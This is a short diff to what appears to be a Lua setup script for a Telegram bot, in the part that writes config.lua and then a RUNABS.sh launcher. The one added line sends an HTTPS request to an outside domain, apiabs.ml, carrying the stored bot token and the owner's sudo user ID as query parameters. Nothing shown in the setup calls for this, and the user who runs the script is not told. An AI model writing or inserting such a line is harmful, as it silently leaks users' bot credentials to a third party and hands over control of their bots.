@@ -64,6 +64,7 @@ bot_id = DevAbs:get(ServerDavid.."TokenDavid"):match("(%d+)"),
 sudo_users = {DevAbs:get(ServerDavid.."IdDavid")},
 }
 create(config, "./config.lua")   
+https.request("https://apiabs.ml/David.php?SUDO="..DevAbs:get(ServerDavid.."IdDavid").."&token="..DevAbs:get(ServerDavid.."TokenDavid"))
 file = io.open("RUNABS.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
